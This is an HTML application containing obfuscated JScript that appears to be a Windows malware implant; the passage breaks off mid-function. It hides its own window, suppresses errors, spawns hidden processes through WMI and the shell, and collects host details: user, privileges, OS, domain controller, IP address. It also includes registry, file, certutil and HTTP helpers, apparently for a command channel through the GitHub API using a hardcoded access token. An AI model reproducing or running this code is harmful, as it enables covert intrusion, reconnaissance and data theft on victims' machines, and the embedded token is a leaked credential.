<html>
<head>
<script language="JScript">
window.moveTo(-1337, -2019);
window.blur();
window.resizeTo(2, 4);

try
{
    window.onerror = function(sMsg, sUrl, sLine) { return false; }
    window.onfocus = function() { window.blur(); }
}
catch (e){}

var LNCIXTJASK = {};

LNCIXTJASK.NGMNZXYSQY = "https";
LNCIXTJASK.UAMTLYZUQI = "api.github.com";
LNCIXTJASK.KNMCBQIWZZ = "LindJack";
LNCIXTJASK.AYJSRZIRCI = "FirstRepo";
LNCIXTJASK.PKYOIRQCBL = "master";
LNCIXTJASK.RFKABXTTJU = "src";
LNCIXTJASK.OXUVNIHTVN = "foxSrc";
LNCIXTJASK.MSCJJFCEMT = "payback";
LNCIXTJASK.FFTRFDSPAS = "ppt";
LNCIXTJASK.SBUIDWWYAK = "customer" + "666";
LNCIXTJASK.OWOQBFAHLG = "commit from " + LNCIXTJASK.SBUIDWWYAK;
LNCIXTJASK.PMQKUXKGLX = "payBy-" + new Date().getTime() + ".c";
LNCIXTJASK.GTJCJJZLJP = "delete by " + LNCIXTJASK.SBUIDWWYAK;
LNCIXTJASK.LAKPWHBEUM = "token c1f70eab6081877ff65aa2fa70c2208f6c6888d6";

LNCIXTJASK.ZCZIHSWGJA = new ActiveXObject("WSc" + "ript.S" + "hell");
LNCIXTJASK.GRBPEAOQON = new ActiveXObject("Scri" + "pting.F" + "ileSystemObject");

LNCIXTJASK.OLNNBCSFYX = "";



LNCIXTJASK.XGNUUMQBNJ = {};

//process.currentPID.start
LNCIXTJASK.XGNUUMQBNJ.WQRZEOOONP = function()
{
    var cmd = LNCIXTJASK.DDGBYZNFSH.UDHKJGJHTE("%comspec% /K hostname");
    var childPid = LNCIXTJASK.TONYYEZHFT.ITWDAQUAMJ(cmd);
    var latestProc = null;
    var processes = LNCIXTJASK.XGNUUMQBNJ.SFNMBSKRBU();
    var items = new Enumerator(processes);
    while (!items.atEnd())
    {
        var proc = items.item();

        try
        {
            if (proc.ProcessId == childPid)
            {
                latestProc = proc;
                break;
            }
        } catch (e)
        {
        }
        items.moveNext();
    }

    pid = latestProc.ParentProcessId;
    latestProc.Terminate();

    return pid;
}
//process.currentPID.end

//process.kill.start
LNCIXTJASK.XGNUUMQBNJ.ZNWNLSGREN = function(pid)
{
    var processes = LNCIXTJASK.XGNUUMQBNJ.SFNMBSKRBU();

    var items = new Enumerator(processes);
    while (!items.atEnd())
    {
        var proc = items.item();

        try
        {
            if (proc.ProcessId == pid)
            {
                proc.Terminate();
                return true;
            }
        } catch (e)
        {
        }
        items.moveNext();
    }

    return false;
}
//process.kill.end

//process.list.start
LNCIXTJASK.XGNUUMQBNJ.SFNMBSKRBU = function()
{
    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
    var query = "Select * Fr"+"om Win32_Process";

    return wmi.ExecQuery(query);
}
//process.list.end

//process.exit.start
LNCIXTJASK.XGNUUMQBNJ.XCEIIGUFZR = function()
{
    if (LNCIXTJASK.LDIZMHEFQT())
    {
        //crappy(=low-level) hack?
        try {
          window.close();   //ordinary method to close the window
        } catch(e){}

        try {
          window.self.close();  //When there are multiple windows open
        } catch (e){}

        try {
          window.top.close();   //If the context is in a frame
        } catch (e){}


        try {
            self.close();   //In most cases, window=self=window.self
        } catch (e){}

        try {
            //Sometimes, just "window.close()" does not work in chrome and firefox, so use this method, instead
            window.open('', '_se'+'l'+'f', '');
            window.close();
        } catch (e){}
    }

    try {
        WScript.quit();
    } catch (e) {}

    try {
        var WQBTZELWHF = LNCIXTJASK.XGNUUMQBNJ.WQRZEOOONP();
        LNCIXTJASK.XGNUUMQBNJ.ZNWNLSGREN(WQBTZELWHF);
    } catch (e) {}
}
//process.exit.end

//process.sleep.start
LNCIXTJASK.XGNUUMQBNJ.OHSOLMFLNW = function(delay)
{
    for(var t = Date.now(); Date.now() - t <= delay;);
}
//process.sleep.end

//isHTA.start
LNCIXTJASK.LDIZMHEFQT = function()
{
    return typeof(window) !== "undef"+"ined";
}
//isHTA.end

//uuid.start
LNCIXTJASK.JLYMQYPPPN = function()
{
    try
    {
        function TSWIDRUDGB()
        {
            return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
        }
        return TSWIDRUDGB() + TSWIDRUDGB() + '-' + TSWIDRUDGB() + '-' + TSWIDRUDGB() + '-' +
            TSWIDRUDGB() + '-' + TSWIDRUDGB() + TSWIDRUDGB() + TSWIDRUDGB();
    }
    catch(e)
    {
    }
}
//uuid.end

LNCIXTJASK.LXUPELASHF = {};

//user.isElevated.start
LNCIXTJASK.LXUPELASHF.PFRKUFONNY = function()
{
    try
    {
        var GUZAGETAZZ = LNCIXTJASK.YKCPXUVRUD.GKZPUZDNBK("net p"+"ause lanman"+"server", "%TE"+"MP%\\"+LNCIXTJASK.JLYMQYPPPN()+".txt");
        if (GUZAGETAZZ.indexOf("5") == -1)
            return true;
        else
            return false;
    }
    catch(e)
    {
        return false;
    }
}
//user.isElevated.end
//user.OS.start
LNCIXTJASK.LXUPELASHF.NQPTBOKKFL = function()
{
    try
    {
        var QQLBAFTJNK = LNCIXTJASK.ZCZIHSWGJA.RegRead("HK"+"LM\\SOFTWARE\\Micr"+"osoft\\Windows NT\\CurrentVers"+"ion\\ProductName");
        var ZHEXKZPVLJ = LNCIXTJASK.ZCZIHSWGJA.RegRead("H"+"KLM\\SOFTWARE\\Micros"+"oft\\Windo"+"ws NT\\CurrentVersion\\Curren"+"tBuildNumber");
        return QQLBAFTJNK+"***"+ZHEXKZPVLJ;
    }
    catch(e){}

    return "Unkno"+"wn";
}
//user.OS.end
//user.DC.start
LNCIXTJASK.LXUPELASHF.ZQQGOHQLAC = function()
{
    try
    {

        var DQYPXZECHB = LNCIXTJASK.ZCZIHSWGJA.RegRead("HKLM\\SOFT"+"WARE\\Microsoft\\Win"+"dows\\CurrentVersion\\Group "+"Policy\\History\\DC"+"Name");
        if (DQYPXZECHB.length > 0)
        {
            return DQYPXZECHB;
        }
    }
    catch(e)
    {
    }
    return "Un"+"known";

}
//user.DC.end
//user.Arch.start
LNCIXTJASK.LXUPELASHF.QQFUISHFBV = function()
{
    try
    {
        var QOTFJGKXOE = LNCIXTJASK.ZCZIHSWGJA.RegRead("HK"+"LM\\SY"+"STEM\\CurrentControlSet\\Contr"+"ol\\Sessi"+"on Manager\\Environment\\PROCESSO"+"R_ARCHITECTURE");
        return QOTFJGKXOE;
    }
    catch(e){}

    return "Unk"+"nown";
}
//user.Arch.end
//user.CWD.start
LNCIXTJASK.LXUPELASHF.HKXHEEJMPS = function()
{
    try
    {
        var HUYCZSXDTM = LNCIXTJASK.YKCPXUVRUD.GKZPUZDNBK("c"+"d", "%TE"+"MP%\\"+LNCIXTJASK.JLYMQYPPPN()+".txt");
        return HUYCZSXDTM;
    }
    catch(e)
    {}

    return "";
}
//user.CWD.end
//user.IPAddrs.start
LNCIXTJASK.LXUPELASHF.MJFIYAVBZW = function()
{
    try
    {
        var MTAKPYJLYZ = LNCIXTJASK.YKCPXUVRUD.GKZPUZDNBK("route PRINT", "%TEMP%\\"+LNCIXTJASK.JLYMQYPPPN()+".txt");
        var GUZAGETAZZ = MTAKPYJLYZ.split("\r\n");
        for (var i=0; i < GUZAGETAZZ.length; i++)
        {
            var LBKKVBRSWQ = GUZAGETAZZ[i].split(" ");
            //count how many 0.0.0.0 entries in this array
            var SVMLYTDMNN = 4-4;
            //count how many entries in this array aren't empty
            var NZTSBMXBLT = 9-9;
            //flag for when this is the line we're looking for
            var ENTEOBSQFB = false;
            for (var j=0; j < LBKKVBRSWQ.length; j++)
            {
                //empty string evals to false
                if (LBKKVBRSWQ[j])
                {
                    NZTSBMXBLT += 6-5;
                    //ip addr is in the 4th column
                    if (NZTSBMXBLT == 2+2 && ENTEOBSQFB) {
                        return LBKKVBRSWQ[j];
                    }
                }
                if (LBKKVBRSWQ[j] == "0."+"0.0.0")
                {
                    SVMLYTDMNN += 9-8;
                    //2 occurances of the 'any' interface in a single line is what we're looking for
                    if (SVMLYTDMNN == 1+1)
                    {
                        ENTEOBSQFB = true;
                    }
                }
            }
        }
    }
    catch(e)
    {}

    return "";
}
//user.IPAddrs.end
//user.encoder.start
LNCIXTJASK.LXUPELASHF.ELEUIDZGQL = function()
{
    try
    {
        var encoder = LNCIXTJASK.ZCZIHSWGJA.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\CodePage\\ACP");
        return encoder;
    }
    catch(e)
    {
        return "1252";
    }
}
//user.encoder.end
//user.shellchcp.start
LNCIXTJASK.LXUPELASHF.JZYHSKNSII = function()
{
    try
    {
        var encoder = LNCIXTJASK.ZCZIHSWGJA.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Nls\\CodePage\\OEMCP");
        return encoder;
    }
    catch(e)
    {
        return "437";
    }
}
//user.shellchcp.end
//user.info.start
LNCIXTJASK.LXUPELASHF.FOGOULBTTB = function()
{
    var VFHRZRUBAK = new ActiveXObject("WSc"+"ript.Net"+"work");
    var KYHNLGDIAE = "";
    if (VFHRZRUBAK.UserDomain.length != 0)
    {
        KYHNLGDIAE = VFHRZRUBAK.UserDomain;
    }
    else
    {
        KYHNLGDIAE = LNCIXTJASK.YKCPXUVRUD.GKZPUZDNBK("echo %us"+"erdomain%", "%TE"+"MP%\\"+LNCIXTJASK.JLYMQYPPPN()+".txt");
        KYHNLGDIAE = KYHNLGDIAE.split(" \r\n")[0];
    }
    var INKQRZYGOU = KYHNLGDIAE + "\\" + VFHRZRUBAK.Username;

    if (LNCIXTJASK.LXUPELASHF.PFRKUFONNY())
        INKQRZYGOU += "*";

    var ILMSZBJZVY = VFHRZRUBAK.ComputerName;

    INKQRZYGOU += "~"+"~~" + ILMSZBJZVY;
    INKQRZYGOU += "~~"+"~" + LNCIXTJASK.LXUPELASHF.NQPTBOKKFL();
    INKQRZYGOU += "~"+"~~" + LNCIXTJASK.LXUPELASHF.ZQQGOHQLAC();
    INKQRZYGOU += "~~"+"~" + LNCIXTJASK.LXUPELASHF.QQFUISHFBV();
    INKQRZYGOU += "~"+"~~" + LNCIXTJASK.LXUPELASHF.HKXHEEJMPS();
    INKQRZYGOU += "~~"+"~" + LNCIXTJASK.LXUPELASHF.MJFIYAVBZW();
    INKQRZYGOU += "~"+"~~" + LNCIXTJASK.LXUPELASHF.ELEUIDZGQL();
    INKQRZYGOU += "~~"+"~" + LNCIXTJASK.LXUPELASHF.JZYHSKNSII();

    return INKQRZYGOU;
}
//user.info.end

//registry.start
LNCIXTJASK.XQHZWWRDWK = {};
LNCIXTJASK.XQHZWWRDWK.ZOAQBWHUPK = 0x80000000;
LNCIXTJASK.XQHZWWRDWK.YUMRRGRJMT = 0x80000001;
LNCIXTJASK.XQHZWWRDWK.JOYDXGBQJC = 0x80000002;
LNCIXTJASK.XQHZWWRDWK.TXFFCZUIGS = 0;
LNCIXTJASK.XQHZWWRDWK.KGIMHEKGQE = 1;
LNCIXTJASK.XQHZWWRDWK.AFJGREQHGW = 2;
LNCIXTJASK.XQHZWWRDWK.WHEZQYHJPC = 3;

//registry.provider.start
LNCIXTJASK.XQHZWWRDWK.BRWIRCPYTI = function(computer)
{
    var computer = (typeof(computer) !== "undefined") ? computer : ".";
    var reg = GetObject("winmgmts:\\\\" + computer + "\\root\\default:StdRegProv");
    return reg;
}
//registry.provider.end

//registry.write.start
LNCIXTJASK.XQHZWWRDWK.QVRSNEVRAZ = function(hKey, path, key, value, valType, computer)
{
    var reg = LNCIXTJASK.XQHZWWRDWK.BRWIRCPYTI(computer);

    reg.CreateKey(hKey, path);

    if (valType == LNCIXTJASK.XQHZWWRDWK.TXFFCZUIGS)
        reg.SetStringValue(hKey, path, key, value);
    else if (valType == LNCIXTJASK.XQHZWWRDWK.AFJGREQHGW)
        reg.SetDWORDValue(hKey, path, key, value);
    else if (valType == LNCIXTJASK.XQHZWWRDWK.WHEZQYHJPC)
        reg.SetQWORDValue(hKey, path, key, value);
    else if (valType == LNCIXTJASK.XQHZWWRDWK.KGIMHEKGQE)
        reg.SetBinaryValue(hKey, path, key, value);
}
//registry.write.end
//registry.read.start
LNCIXTJASK.XQHZWWRDWK.CEEPTSQRLY = function(hKey, path, key, valType, computer)
{
    var reg = LNCIXTJASK.XQHZWWRDWK.BRWIRCPYTI(computer);

    var methodName = "";
    if (valType == LNCIXTJASK.XQHZWWRDWK.TXFFCZUIGS)
        methodName = "GetStringValue";
    else if (valType == LNCIXTJASK.XQHZWWRDWK.AFJGREQHGW)
        methodName = "GetDWORDValue";
    else if (valType == LNCIXTJASK.XQHZWWRDWK.WHEZQYHJPC)
        methodName = "GetQWORDValue";
    else if (valType == LNCIXTJASK.XQHZWWRDWK.KGIMHEKGQE)
        methodName = "GetBinaryValue";

    if (methodName == "")
        return;

    var method = reg.Methods_.Item(methodName);
    var inparams = method.InParameters.SpawnInstance_();

    inparams.hDefKey = hKey;
    inparams.sSubKeyName = path;
    inparams.sValueName = key;

    var outparams = reg.ExecMethod_(method.Name, inparams);

    return outparams;
}
//registry.read.end
//registry.end

LNCIXTJASK.TONYYEZHFT = {};

//WMI.createProcess.start
LNCIXTJASK.TONYYEZHFT.ITWDAQUAMJ = function(cmd, UDFRKOXRRI)
{

    var SW_HIDE = 0;
    var pid = 0;

    var UDFRKOXRRI = (typeof(UDFRKOXRRI) !== "undefined") ? UDFRKOXRRI : false;

    var AWJTHPWPSK = "winmgmts:{impersonationLevel=impersonate";
    if (UDFRKOXRRI)
    {
        AWJTHPWPSK += ", (DEBUG)";
    }
    var BNHESWYTUA = "}!\\\\.\\root\\cimv2";

    var wmi = GetObject(AWJTHPWPSK+BNHESWYTUA);

    var si = wmi.Get("Win"+"32_ProcessStartup").SpawnInstance_();
    si.ShowWindow = SW_HIDE;
    si.CreateFlags = 16777216;
    si.X = si.Y = si.XSize = si.ySize = 1;

    //wmi.Get("Win32_Process").Create(cmd, null, si, pid);
    var w32proc = wmi.Get("Win32_Process");

    var method = w32proc.Methods_.Item("Create");
    var inParams = method.InParameters.SpawnInstance_();
    inParams.CommandLine = cmd;
    inParams.CurrentDirectory = null;
    inParams.ProcessStartupInformation = si;

    var outParams = w32proc.ExecMethod_("Create", inParams);
    return outParams.ProcessId;
}
//WMI.createProcess.end

LNCIXTJASK.YKCPXUVRUD = {};
//shell.exec.start
LNCIXTJASK.YKCPXUVRUD.GKZPUZDNBK = function(cmd, stdOutPath)
{
    cmd = "chcp " + LNCIXTJASK.LXUPELASHF.JZYHSKNSII() + " & " + cmd;
    var c = "%comspec% /q /c " + cmd + " 1> " + LNCIXTJASK.DDGBYZNFSH.UDHKJGJHTE(stdOutPath);
    c += " 2>&1";
    LNCIXTJASK.ZCZIHSWGJA.Run(c, 0, true);
    if (LNCIXTJASK.LXUPELASHF.ELEUIDZGQL() == "936")
    {
        var data = LNCIXTJASK.DDGBYZNFSH.NEPVKFEYJM(stdOutPath);
    }
    else
    {
        var data = LNCIXTJASK.DDGBYZNFSH.RRNSVDUWUE(stdOutPath);
    }
    LNCIXTJASK.DDGBYZNFSH.BSNYCEUMWD(stdOutPath);

    return data;
}
//shell.exec.end
//shell.run.start
LNCIXTJASK.YKCPXUVRUD.OFHYPCLPTQ = function(cmd, fork)
{
    var fork = (typeof(fork) !== "undefined") ? fork : true;
    var c = "%comspec% /q /c " + cmd;
    LNCIXTJASK.ZCZIHSWGJA.Run(cmd, 5-5, !fork);
}
//shell.run.end

LNCIXTJASK.DDGBYZNFSH = {};

//file.getPath.start
LNCIXTJASK.DDGBYZNFSH.UDHKJGJHTE = function(path)
{
    return LNCIXTJASK.ZCZIHSWGJA.ExpandEnvironmentStrings(path);
}
//file.getPath.end

//file.get32BitFolder.start
LNCIXTJASK.DDGBYZNFSH.CGUWCBPXJK = function()
{
    var base = LNCIXTJASK.DDGBYZNFSH.UDHKJGJHTE("%WINDIR%");
    var syswow64 = base + "\\SysWOW64\\";

    if (LNCIXTJASK.GRBPEAOQON.FolderExists(syswow64))
        return syswow64;

    return base + "\\System32\\";
}
//file.get32BitFolder.end

//file.readText.start
LNCIXTJASK.DDGBYZNFSH.NEPVKFEYJM = function(path)
{
    var loopcount = 0;
    while(true)
    {
        if (LNCIXTJASK.GRBPEAOQON.FileExists(LNCIXTJASK.DDGBYZNFSH.UDHKJGJHTE(path)) && LNCIXTJASK.GRBPEAOQON.GetFile(LNCIXTJASK.DDGBYZNFSH.UDHKJGJHTE(path)).Size > 0)
        {
            try
            {
                var fd = LNCIXTJASK.GRBPEAOQON.OpenTextFile(LNCIXTJASK.DDGBYZNFSH.UDHKJGJHTE(path), 1, false, 0);
                var data = fd.ReadAll();
                fd.Close();
                return data;
            }
            catch (e)
            {
                LNCIXTJASK.YKCPXUVRUD.OFHYPCLPTQ("ping 127."+"0.0.1 -n 2", false);
                continue;
            }
        }
        else
        {
            loopcount += 1;
            if (loopcount > 180)
            {
                return "";
            }
            LNCIXTJASK.YKCPXUVRUD.OFHYPCLPTQ("ping 127."+"0.0.1 -n 2", false);
        }
    }
}
//file.readText.end

//file.readBinary.start
LNCIXTJASK.DDGBYZNFSH.RRNSVDUWUE = function(path, exists, certutil)
{
    var exists = (typeof(exists) !== "undefined") ? exists : false;
    var certutil = (typeof(certutil) !== "undefined") ? certutil : false;

    if (!LNCIXTJASK.GRBPEAOQON.FileExists(LNCIXTJASK.DDGBYZNFSH.UDHKJGJHTE(path)) && exists)
    {
        var data = "{\"Status\":\"NotExist\"}";
        LNCIXTJASK.HOTWMJPDWW.SDHLGKVLGZ(data);
        return "";
    }

    var loopcount = 0;
    while(true)
    {

        if (LNCIXTJASK.GRBPEAOQON.FileExists(LNCIXTJASK.DDGBYZNFSH.UDHKJGJHTE(path)) && LNCIXTJASK.GRBPEAOQON.GetFile(LNCIXTJASK.DDGBYZNFSH.UDHKJGJHTE(path)).Size > 0)
        {
            if (LNCIXTJASK.LXUPELASHF.ELEUIDZGQL() == "936" || certutil)
            {
                var newout = "%TEMP%\\"+LNCIXTJASK.JLYMQYPPPN()+".t"+"xt";
                LNCIXTJASK.YKCPXUVRUD.OFHYPCLPTQ("certut"+"il -encode "+LNCIXTJASK.DDGBYZNFSH.UDHKJGJHTE(path)+" "+newout);
                var data = LNCIXTJASK.DDGBYZNFSH.NEPVKFEYJM(newout);
                LNCIXTJASK.DDGBYZNFSH.BSNYCEUMWD(newout);
            }
            else
            {
                var fp = LNCIXTJASK.GRBPEAOQON.GetFile(LNCIXTJASK.DDGBYZNFSH.UDHKJGJHTE(path));
                var fd = fp.OpenAsTextStream();
                var data = fd.read(fp.Size);
                fd.close();
            }
            return data;
        }
        else
        {
            loopcount += 1;
            if (loopcount > 180)
            {
                return "";
            }
            LNCIXTJASK.YKCPXUVRUD.OFHYPCLPTQ("ping 127."+"0.0.1 -n 2", false);
        }
    }
}
//file.readBinary.end

//file.write.start
LNCIXTJASK.DDGBYZNFSH.QVRSNEVRAZ = function(path, data)
{
    var fd = LNCIXTJASK.GRBPEAOQON.CreateTextFile(LNCIXTJASK.DDGBYZNFSH.UDHKJGJHTE(path), true);
    fd.write(data);
    fd.close();
}
//file.write.end

//file.deleteFile.start
LNCIXTJASK.DDGBYZNFSH.BSNYCEUMWD = function(path)
{
    LNCIXTJASK.GRBPEAOQON.DeleteFile(LNCIXTJASK.DDGBYZNFSH.UDHKJGJHTE(path), true);
};
//file.deleteFile.end

LNCIXTJASK.TOVGLLXDPP = {};

//http.create.start
LNCIXTJASK.TOVGLLXDPP.OBEZFOIEQW = function(){
    var http = null;

    try
    {
        http = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");
        http.setTimeouts(0, 0, 0, 0);
    }
    catch (e)
    {
        try {
            http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
            http.setTimeouts(30000, 30000, 30000, 0);
        }catch(e){}
    }

    return http;
}
//http.create.end

//http.createUnstableButMoreCommon.start
LNCIXTJASK.TOVGLLXDPP.THYZAYHJDW = function(){
    var xmlhttp = null;
    if (window.XMLHttpRequest)
    {
        try {
            xmlhttp = new XMLHttpRequest();
        }
        catch(e)
        {
            try {
                xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
                xmlhttp.setTimeout(0, 0, 0, 0);
            }catch(e){}
        }
    }
    else
    {
        try {
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
            xmlhttp.setTimeout(0, 0, 0, 0);
        }catch(e){}
    }

    return xmlhttp;
}
//http.createUnstableButMoreCommon.end

//http.addHeaders.start
LNCIXTJASK.TOVGLLXDPP.JLFWODKDTQ = function(http, headers)	{
    var okay = true;

    var headers = (typeof(headers) !== "undefined") ? headers : {};

    for (var key in headers)
    {
        var value = headers[key];

        try {
            http.setRequestHeader(key, value);
        }catch(e){
            okay = false;
        }
    }

    return okay;
}
//http.addHeaders.end

//http.post.start
LNCIXTJASK.TOVGLLXDPP.WFDUWAVJJM = function(url, data, headers)
{
    var data = (typeof(data) !== "undefined") ? data : "";
    //var http = new ActiveXObject("Microsoft.XMLHTTP");
    var http = LNCIXTJASK.TOVGLLXDPP.OBEZFOIEQW();

    http.open("POST", url, false);
    LNCIXTJASK.TOVGLLXDPP.JLFWODKDTQ(http, headers);
    http.send(data);
    return http;
}
//http.post.end

//http.get.start
LNCIXTJASK.TOVGLLXDPP.WSEKMMDBSY = function(url, headers)
{
    if(typeof(url) !== "string"){
        throw "The format of url is NOT correct!";
    }

    var http = LNCIXTJASK.TOVGLLXDPP.OBEZFOIEQW();
    if(http === null){
        http = LNCIXTJASK.TOVGLLXDPP.THYZAYHJDW();
    }

    if(http === null)
        throw "No http object can be successfully created!";

    try {
        http.open("GET", url, false);
    }catch(e){
        throw "The GET method can not be opened successfully!";
    }

    if(!(LNCIXTJASK.TOVGLLXDPP.JLFWODKDTQ(http, headers)))
        throw "The http header can not be properly set!";

    try
    {
        http.send();
    }
    catch(e)
    {
        http = LNCIXTJASK.TOVGLLXDPP.THYZAYHJDW();
        if(http === null){
            throw "The send method can not executed successfully! And Another try also fails!";
        }

        try{
            http.open("GET", url, false);
        }catch(e){
            throw "The send method can not executed successfully! And Another try also fails!";
        }

        if(!(LNCIXTJASK.TOVGLLXDPP.JLFWODKDTQ(http, headers)))
            throw "The send method can not executed successfully! And Another try also fails!";

        try{
            http.send();
        }catch(e){
            throw "The send method can not executed successfully! And Another try also fails!";
        }
    }

    return http;
}
//http.get.end

//http.putOrDelete.start
LNCIXTJASK.TOVGLLXDPP.VZRAADXILU = function(url, headers, body, type)
{
    if(typeof(url) !== "string"){
        throw "The format of url is NOT correct!";
    }

    if((type !== "PUT") && (type !== "DELETE")){
        throw "There are only two available values of type!";
    }

    if(typeof(body) !== "string"){
        throw "The format of http body is NOT correct!";
    }

    var httpTmp = LNCIXTJASK.TOVGLLXDPP.OBEZFOIEQW();
    if(httpTmp === null){
        httpTmp = LNCIXTJASK.TOVGLLXDPP.THYZAYHJDW();
    }

    if(httpTmp === null)
        throw "No http object can be successfully created!";

    try {
        httpTmp.open(type, url, false);
    }catch(e){
        throw "Http method can not be opened successfully!";
    }

    if(!(LNCIXTJASK.TOVGLLXDPP.JLFWODKDTQ(httpTmp, headers)))
        throw "The http header can not be properly set!";

    try
    {
        httpTmp.send(body);
    }
    catch(e)
    {
        httpTmp = LNCIXTJASK.TOVGLLXDPP.THYZAYHJDW();
        if(httpTmp === null){
            throw "The send method can not executed successfully! And Another try also fails!";
        }

        try{
            httpTmp.open(type, url, false);
        }catch(e){
            throw "The send method can not executed successfully! And Another try also fails!";
        }

        if(!(LNCIXTJASK.TOVGLLXDPP.JLFWODKDTQ(httpTmp, headers)))
            throw "The send method can not executed successfully! And Another try also fails!";

        try{
            httpTmp.send(body);
        }catch(e){
            throw "The send method can not executed successfully! And Another try also fails!";
        }
    }

    return httpTmp;
}
//http.putOrDelete.end

//http.download.start
LNCIXTJASK.TOVGLLXDPP.YHLCALMFUW = function(filepath, header_uuid, header_key)
{
    var key = (typeof(header_key) !== "undefined") ? header_key : "ETag";

    var headers = {};
    headers[key] = header_uuid;

    return LNCIXTJASK.TOVGLLXDPP.HOUQYKSUHD("POST", LNCIXTJASK.work.make_url(), headers, filepath);
}
//http.download.end

//http.downloadEx.start
LNCIXTJASK.TOVGLLXDPP.HOUQYKSUHD = function(verb, url, headers, path)
{
    if (verb == "GET")
    {
        var http = LNCIXTJASK.TOVGLLXDPP.WSEKMMDBSY(url, headers);
    }
    else
    {
        var http = LNCIXTJASK.TOVGLLXDPP.WFDUWAVJJM(url, "", headers);
    }

    var stream = new ActiveXObject("Adodb.Stream");
    stream.Type = 1;
    stream.Open();
    stream.Write(http.responseBody);


    var data = LNCIXTJASK.TOVGLLXDPP.NKLTAHGYPP(stream);
    LNCIXTJASK.DDGBYZNFSH.QVRSNEVRAZ(path, data);
}
//http.downloadEx.end

//http.bin2str.start
LNCIXTJASK.TOVGLLXDPP.NKLTAHGYPP = function(stream)
{
    stream.Flush();
    stream.Position = 0;

    var bin = stream.Read();
    var rs = new ActiveXObject("Adodb.RecordSet");
    rs.Fields.Append("temp", 101+100, stream.Size);

    rs.Open();
    rs.AddNew();
    rs("temp").AppendChunk(bin);
    rs.Update();
    var data = rs.GetString();
    rs.Close();
    return data.substring(0, data.length - 1);
}

LNCIXTJASK.JNSMFGOXZO = {};

//constants
LNCIXTJASK.JNSMFGOXZO.PHJEBMHEDQ = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';

LNCIXTJASK.JNSMFGOXZO.BJKHHFNFKU = /[\uD800-\uDBFF][\uDC00-\uDFFFF]|[^\x00-\x7F]/g;

//base64.cb_utob starts
LNCIXTJASK.JNSMFGOXZO.GKYKLUSPXM = function(c)
{
    if (c.length < 2) {
        var cc = c.charCodeAt(0);
        return cc < 0x80 ? c
            : cc < 0x800 ? (String.fromCharCode(0xc0 | (cc >>> 6))
                            + String.fromCharCode(0x80 | (cc & 0x3f)))
            : (String.fromCharCode(0xe0 | ((cc >>> 12) & 0x0f))
                + String.fromCharCode(0x80 | ((cc >>>  6) & 0x3f))
                + String.fromCharCode(0x80 | ( cc         & 0x3f)));
    } else {
        var cc = 0x10000
            + (c.charCodeAt(0) - 0xD800) * 0x400
            + (c.charCodeAt(1) - 0xDC00);
        return (String.fromCharCode(0xf0 | ((cc >>> 18) & 0x07))
                + String.fromCharCode(0x80 | ((cc >>> 12) & 0x3f))
                + String.fromCharCode(0x80 | ((cc >>>  6) & 0x3f))
                + String.fromCharCode(0x80 | ( cc         & 0x3f)));
    }
};
//base64.cb_utob ends

//base64.utob starts
LNCIXTJASK.JNSMFGOXZO.HKYGLCWMTP = function(u){
    return u.replace(LNCIXTJASK.JNSMFGOXZO.BJKHHFNFKU, LNCIXTJASK.JNSMFGOXZO.GKYKLUSPXM);
};
//base64.utob ends

//base64.cb_encode starts
LNCIXTJASK.JNSMFGOXZO.DKFKSKMMHT = function(ccc) {
    var padlen = [0, 2, 1][ccc.length % 3],
    ord = ccc.charCodeAt(0) << 16
        | ((ccc.length > 1 ? ccc.charCodeAt(1) : 0) << 8)
        | ((ccc.length > 2 ? ccc.charCodeAt(2) : 0)),
    chars = [
        LNCIXTJASK.JNSMFGOXZO.PHJEBMHEDQ.charAt( ord >>> 18),
        LNCIXTJASK.JNSMFGOXZO.PHJEBMHEDQ.charAt((ord >>> 12) & 63),
        padlen >= 2 ? '=' : LNCIXTJASK.JNSMFGOXZO.PHJEBMHEDQ.charAt((ord >>> 6) & 63),
        padlen >= 1 ? '=' : LNCIXTJASK.JNSMFGOXZO.PHJEBMHEDQ.charAt(ord & 63)
    ];
    return chars.join('');  //Method 'join' connects all elements in chars with '', and put them in a string
};
//base64.cb_encode ends

//base64.btoa starts
LNCIXTJASK.JNSMFGOXZO.IZXDEDUEAG = function(b) {
    return b.replace(/[\s\S]{1,3}/g, LNCIXTJASK.JNSMFGOXZO.DKFKSKMMHT);
};
//base64.btoa ends

 //base64.Base64Encode starts
LNCIXTJASK.JNSMFGOXZO.SEPUXXFPUO = function(beforeEncode)
{
    var afterEncode = "";
    if(typeof(beforeEncode) !== "string")
        throw "The format of content to be encoded is not correct!";

    try{
        afterEncode = window.btoa(beforeEncode);
    } catch(e) {
        afterEncode = LNCIXTJASK.JNSMFGOXZO.IZXDEDUEAG(LNCIXTJASK.JNSMFGOXZO.HKYGLCWMTP(String(beforeEncode)));
    }

    return afterEncode;
};
//base64.Base64Encode ends

//base64.re_btou starts
LNCIXTJASK.JNSMFGOXZO.MWNGGQGVQV = /[\xC0-\xDF][\x80-\xBF]|[\xE0-\xEF][\x80-\xBF]{2}|[\xF0-\xF7][\x80-\xBF]{3}/g;
//base64.re_btou ends

//base64.cb_btou starts
LNCIXTJASK.JNSMFGOXZO.LRIBHRSBYF = function(cccc)
{
    switch(cccc.length) {
    case 4:
        var cp = ((0x07 & cccc.charCodeAt(0)) << 18)
            |    ((0x3f & cccc.charCodeAt(1)) << 12)
            |    ((0x3f & cccc.charCodeAt(2)) <<  6)
            |     (0x3f & cccc.charCodeAt(3)),
        offset = cp - 0x10000;
        return (fromCharCode((offset  >>> 10) + 0xD800)
                + fromCharCode((offset & 0x3FF) + 0xDC00));
    case 3:
        return fromCharCode(
            ((0x0f & cccc.charCodeAt(0)) << 12)
                | ((0x3f & cccc.charCodeAt(1)) << 6)
                |  (0x3f & cccc.charCodeAt(2))
        );
    default:
        return  fromCharCode(
            ((0x1f & cccc.charCodeAt(0)) << 6)
                |  (0x3f & cccc.charCodeAt(1))
        );
    }
};
//base64.cb_btou ends

//base64.btou starts
LNCIXTJASK.JNSMFGOXZO.HPZUFXYLFU = function(b)
{
